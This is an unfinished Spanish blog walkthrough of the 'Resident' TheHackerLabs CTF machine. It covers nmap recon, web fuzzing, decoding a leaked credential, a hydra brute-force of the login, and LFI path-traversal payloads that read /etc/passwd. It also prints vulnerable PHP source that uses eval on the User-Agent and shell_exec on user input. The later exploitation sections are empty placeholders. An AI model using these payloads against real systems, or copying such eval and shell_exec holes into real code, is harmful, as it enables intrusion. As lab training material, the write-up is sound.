---
layout: single
title: Resident - TheHackerLabs
excerpt: "."
date: 2025-09-16
classes: wide
header:
  teaser: /assets/images/THL-writeup-resident/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Linux
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-resident/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.110
PING 192.168.100.110 (192.168.100.110) 56(84) bytes of data.
64 bytes from 192.168.100.110: icmp_seq=1 ttl=64 time=2.00 ms
64 bytes from 192.168.100.110: icmp_seq=2 ttl=64 time=0.656 ms
64 bytes from 192.168.100.110: icmp_seq=3 ttl=64 time=0.946 ms
64 bytes from 192.168.100.110: icmp_seq=4 ttl=64 time=1.04 ms

--- 192.168.100.110 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 0.656/1.160/2.001/0.505 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.110 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 12:49 CST
Initiating ARP Ping Scan at 12:49
Scanning 192.168.100.110 [1 port]
Completed ARP Ping Scan at 12:49, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:49
Scanning 192.168.100.110 [65535 ports]
Discovered open port 22/tcp on 192.168.100.110
Discovered open port 80/tcp on 192.168.100.110
Completed SYN Stealth Scan at 12:49, 10.98s elapsed (65535 total ports)
Nmap scan report for 192.168.100.110
Host is up, received arp-response (0.00077s latency).
Scanned at 2025-09-16 12:49:19 CST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
           Raw packets sent: 80877 (3.559MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo veo 2 puertos abiertos. Supongo que la intrusión será por el **puerto 80**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,80 192.168.100.110 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 12:49 CST
Nmap scan report for 192.168.100.110
Host is up (0.00082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 e8:fc:cb:53:f8:97:01:69:27:3c:58:0c:48:b7:28:eb (ECDSA)
|_  256 fa:87:ab:ce:92:42:86:71:55:00:b1:35:96:93:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Iniciar Sesi\xC3\xB3n
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Observa lo que obtuvo el escaneo de la página web activa en el **puerto 80**.

Tenemos una cookie y el titulo de la página hace mención a un login.

Analicemos esa página web.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura1.png">
</p>

Parece ser un simple login.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura2.png">
</p>

Nos menciona que el login esta hecho con **PHP**, algo bastante útil pues pueden existir más scripts hecho en **PHP**.

Si revisamos el código fuente, no encontraremos algo de utilidad.

Podríamos intentar aplicar inyecciones SQL, pero no parecen funcionar en este caso.

Apliquémos **Fuzzing** para ver si existe algún otro script de PHP o directorio oculto.

<br>

<h2 id="fuzz">Fuzzing</h2>

Esta vez, utilizaremos **wfuzz** porque la herramienta **ffuf** no obtuvo ningún resultado: 
```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt-html  http://192.168.100.110/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.110/FUZZ.FUZ2Z
Total requests: 661635

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   200        74 L     179 W      2280 Ch     "index - php"                                                                                                                
000003631:   302        0 L      0 W        0 Ch        "logout - php"                                                                                                               
000000211:   200        934 L    4733 W     79748 Ch    "info - php"                                                                                                                 
000008737:   302        0 L      0 W        0 Ch        "dashboard - php"                                                                                                            
000005252:   200        3 L      4 W        144 Ch      "robots - txt"                                                                                                               
000004756:   200        1 L      0 W        1 Ch        "connect - php"                                                                                                              
000135678:   403        9 L      28 W       280 Ch      "html"                                                                                                                       
000135676:   403        9 L      28 W       280 Ch      "php"                                                                                                                        

Total time: 814.0375
Processed Requests: 661635
Filtered Requests: 661627
Requests/sec.: 812.7819
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*       | Para indicar una busqueda de archivos específicos. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.110/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x .php,.txt,.html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.110/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 79489]
/index.php            (Status: 200) [Size: 2284]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.100.110/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/connect.php          (Status: 200) [Size: 1]
/robots.txt           (Status: 200) [Size: 144]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/server-status        (Status: 403) [Size: 280]
Progress: 882176 / 882176 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |

<br>

Obtuvimos varios resultados, de los que solamente podremos ver **info.php** y **robots.txt**.

Pero si leemos el archivo **robots.txt**, veremos algo interesante:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura3.png">
</p>

Parece que encontramos un usuario y contraseña para el login, pero la contraseña es un poco extraña.

Vamos a analizarla.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="base64">Identificación y Decodificación de Contraseña en Base64</h2>

Viendolo de manera rápida, parece que es un Hash extraño, pero no lo es.

Observa que se pueden ver los caracteres **z** y **9**, lo que nos puede dar un indicio de que esta codificado en **base64**.

Decodifiquemoslo:
```bash
echo -n 'JTM1JTYxJTMwJTM2JTMxJTM1JTMzJTYyJTMxJTMyJTYyJTMyJTY1JTYzJTM2JTMyJTMxJTMwJTYxJTM4JTYyJTYyJTM2JTM2JTY2JTM0JTY1JTM3JTM4JTYzJTM0' | base64 -d
%35%61%30%36%31%35%33%62%31%32%62%32%65%63%36%32%31%30%61%38%62%62%36%36%66%34%65%37%38%63%34
```
Esto nos puede despistar.

Pero resulta ser código **URL encodeado**, que podemos decodificarlo con **CyberChef** o **BurpSuite**.

Primero, hagamoslo con **CyberChef**:
* <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>

Pasemos el Hash en **base64**, lo decodificamos y la respuesta, la decodificamos en **URL decode**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura4.png">
</p>

Obtuvimos lo que parece ser un **Hash MD5**.

Ahora veamos como obtener el mismo Hash con **BurpSuite** usando el **Decoder**.

Tan solo debemos escoger en el botón `Decode as...` **Base64** y luego **URL**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura5.png">
</p>

Listo, obtenemos el mismo Hash.

Pero, si analizamos la cantidad de caracteres de ese Hash, resulta que le falta 1 caracter para cumplir con el tamaño en regla de una **Hash MD5**:
```bash
echo -n '5a06153b12b2ec6210a8bb66f4e78c4' | wc -c
31
```

Para averiguar que caracter nos falta, podemos crear un wordlist que contenga de la letra `a-f` y del número `0-9`.

Lo podemos crear con **crunch**:
```bash
crunch 32 32 abcdefABCDEF0123456789 -t 5a06153b12b2ec6210a8bb66f4e78c4@ -o MD5wordlist.txt
Crunch will now generate the following amount of data: 726 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 22 

crunch: 100% completed generating output
```
Suponiendo que el **Hash MD5** es la contraseña, podemos aplicar fuerza bruta al login con **hydra** para identificar que Hash es el correcto.

Lo usaremos para que ataque un formulario por **petición POST** y en el código fuente del login, veremos los parámetros que se envían:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura6.png">
</p>

Y podemos usar el mensaje de error del login como un filtro:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura7.png">
</p>

Probémoslo:
```bash
hydra -l 'admin' -P ./MD5wordlist.txt 192.168.100.110 http-form-post '/index.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 15:18:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries (l:1/p:22), ~2 tries per task
[DATA] attacking http-post-form://192.168.100.110:80/index.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos
[80][http-post-form] host: 192.168.100.110   login: admin   password: 5a06153b12b2ec6210a8bb66f4e78c4*
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 15:18:44
```
Lo tenemos.

Y si lo probamos en el login, ganaremos acceso:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura8.png">
</p>

<br>

<h2 id="LFI">Identificando Cross-Site Scripting (XSS) y Local File Inclusion (LFI) y Server-Side Request Forgery (SSRF)</h2>

En el dashboard podemos mandar texto y solicitar una URL.

Analizando el funcionamiento del campo de envio de texto, vemos que es posible aplicar **XSS**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura9.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura10.png">
</p>

Pero esto no nos ayuda de momento.

Para probar el campo de la URL, vamos a crear un archivo random de texto y luego levantaremos un servidor web con **Python3**:
```bash
echo -n "Esto es un test" > test.txt

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Usemos la URL de nuestro servidor para probar este campo:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura11.png">
</p>

Funciona y obversa que en la URL aparece el parámetro `url=`.

Podemos hacer varias pruebas con este parámetro:
* Probar **Local File Inclusion (LFI)**.
* Probar **Remote File Inclusion (RFI)**.
* Y probar **Server-Side Request Forgery (SSRF)**.

Enfoquemonos en el **LFI**.

<br>

<h3 id="LFI+Wrapper">Aplicando LFI + PHP Wrapper en Parámetro Vulnerable del Dashboard</h3>

Al querer comprobar si el parámetro es vulnerable a **LFI**, podremos obtener muchos resultados variados, siendo que ninguno de ellos lo demuestra con claridad.

Pero recordando que la página web esta hecha con **PHP**, es posible que funcione un **PHP Wrapper**.

Tomemos en cuenta algunas cosillas:
* La primera opción de **PHP Wrapper** a utilizar es `file://`, ya que este permite la inclusión de archivos locales.
* Necesitamos usar la cookie de nuestra sesión para que funcione el ataque.
* Usaremos la herramienta **wfuzz** pues es la mejor opción (al menos a mi parecer) para esta clase de pruebas.
* Por último, usaremos el wordlists **LFI-Jhaddix.txt** de **SecLists**.

Probémoslo:
```bash
wfuzz -c --hc=404 -t 300 --hl=162,163 -b 'PHPSESSID=Tu_Cookie' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://192.168.100.110/dashboard.php?url=file:FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.110/dashboard.php?url=file:FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000020:   200        200 L    519 W      7562 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                                                        
000000023:   200        200 L    519 W      7545 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                                                     
000000016:   200        200 L    519 W      7560 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                                          
000000311:   200        200 L    519 W      7547 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                                 
000000654:   500        0 L      0 W        0 Ch        "../../../../../../../var/log/apache2/error.log"                                                                             
000000650:   500        0 L      0 W        0 Ch        "../../../../../../../var/log/apache2/access.log"                                                                            
000000929:   200        200 L    519 W      7545 Ch     "///////../../../etc/passwd"                                                                                                 
000000206:   200        170 L    488 W      5679 Ch     "../../../../../../../../../../../../etc/hosts"                                                                              
000000254:   200        200 L    519 W      7560 Ch     "/../../../../../../../../../../etc/passwd"                                                                                  
000000258:   200        200 L    519 W      7595 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                               
000000262:   200        200 L    519 W      7583 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                           
000000270:   200        200 L    519 W      7559 Ch     "../../../../../../../../../../etc/passwd"                                                                                   
000000274:   200        200 L    519 W      7547 Ch     "../../../../../../etc/passwd"                                                                                               
000000275:   200        200 L    519 W      7544 Ch     "../../../../../etc/passwd"                                                                                                  
000000273:   200        200 L    519 W      7550 Ch     "../../../../../../../etc/passwd"                                                                                            
000000272:   200        200 L    519 W      7553 Ch     "../../../../../../../../etc/passwd"                                                                                         
000000269:   200        200 L    519 W      7562 Ch     "../../../../../../../../../../../etc/passwd"                                                                                
000000271:   200        200 L    519 W      7556 Ch     "../../../../../../../../../etc/passwd"                                                                                      
000000268:   200        200 L    519 W      7565 Ch     "../../../../../../../../../../../../etc/passwd"                                                                             
000000267:   200        200 L    519 W      7568 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                          
000000265:   200        200 L    519 W      7574 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                                    
000000266:   200        200 L    519 W      7571 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                       
000000261:   200        200 L    519 W      7586 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                        
000000260:   200        200 L    519 W      7589 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                     
000000263:   200        200 L    519 W      7580 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                              
000000259:   200        200 L    519 W      7592 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                  
000000264:   200        200 L    519 W      7577 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                 

Total time: 13.01819
Processed Requests: 929
Filtered Requests: 902
Requests/sec.: 71.36166
```
Obtuve mejores resultados usando `file:`, pues observa que hay varias formas de aplicar el **LFI**.

Y lo podemos probar en la página web:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura12.png">
</p>

Vemos qué existe el **usuario ram**, quizá le podamos aplicar fuerza bruta, pero dejemoslo para más adelante.

Pero algo importante que podemos ver, es que se pudo identificar el archivo **error.log** y **access.log**, lo que nos podría indicar que la página es vulnerable a **Log Poisoning**.

Aunque ahí mismo nos dice que no hay contenido por ver, por lo que una opción bastante viable, es buscar la forma de poder ver estos dos archivos.

<br>

<h3 id="Dashboard">Obteniendo y Analizando Código Fuente de dashboard.php con LFI + PHP Wrapper</h3>

Otra cosa que podemos hacer, ya que funciono el uso de **PHP Wrappers**, es tratar de obtener el código de la página actual, osea, el código fuente completo de la página **dashboard.php**.

Esto lo podemos hacer con el **PHP Wrapper** `php://filter/convert.base64-encode/resource=` para obtener todo el código en **base64**:

<p align="center">
<img src="/assets/images/THL-writeup-resident/Captura13.png">
</p>

Lo tenemos, ya solo falta decodificarlo:
```bash
echo -n 'base64_copiada' | base64 -d
...
<?php
session_start();

// Verificar si el usuario ha iniciado sesión
if (!isset($_SESSION['username'])) {
    header("Location: index.php");
    exit();
}

// Inicializar variables
$message = "";
$response = "";

// Evaluar el User-Agent y ejecutar código PHP
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    // Se obtiene el User-Agent
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Ejecutar el código PHP contenido en el User-Agent
    if (preg_match('/<\?php(.*)\?>/s', $user_agent, $matches)) {
        // Extraer el código y evaluarlo
        eval($matches[1]);
    }
}

// Procesar la URL proporcionada en la consulta
if (isset($_GET['url'])) {
    // Obtener la URL de la consulta
    $url = $_GET['url'];

    // Validar y procesar la solicitud SSRF si se proporciona una URL
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        // Realizar la solicitud a la URL ingresada
        // Esto es vulnerable a SSRF
        $response = @file_get_contents($url); // Usar @ para suprimir errores
        if ($response === FALSE) {
            $response = "No se pudo acceder a la URL.";
        } else {
            // Si la solicitud fue exitosa, mostrar el contenido recibido
            $response = htmlspecialchars($response);
        }
    } else {
        $response = "URL no válida.";
    }
}

// Procesar el mensaje enviado desde el formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user_message'])) {
    // Obtener el mensaje del formulario
    $message = $_POST['user_message'];

    // Aquí se ejecuta el comando si se detecta la palabra clave "cmd:"
    if (strpos($message, 'cmd:') === 0) {
        $command = substr($message, 4); // Obtener el comando después de "cmd:"
        // Ejecutar el comando y almacenar la salida
        $output = shell_exec($command);
        $message = htmlspecialchars($output); // Muestra la salida en el mensaje
    }
}
?>
...
```
Observa todo el código que obtuvimos y lo que nos interesa es el script de **PHP**.

Ahí mismo vemos que vulnerabilidades podemos explotar:
* 
* 
* 

Vamos a aplicarlo.

<br>

<h2 id="SSRF">Aplicando Server-Side Request Forgery (SSRF)</h2>




<br>

<h2 id="Poisoning">Aplicando Log Poisoning para Aplicar Remote Code Execution (RCE)</h2>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```



<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>





<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
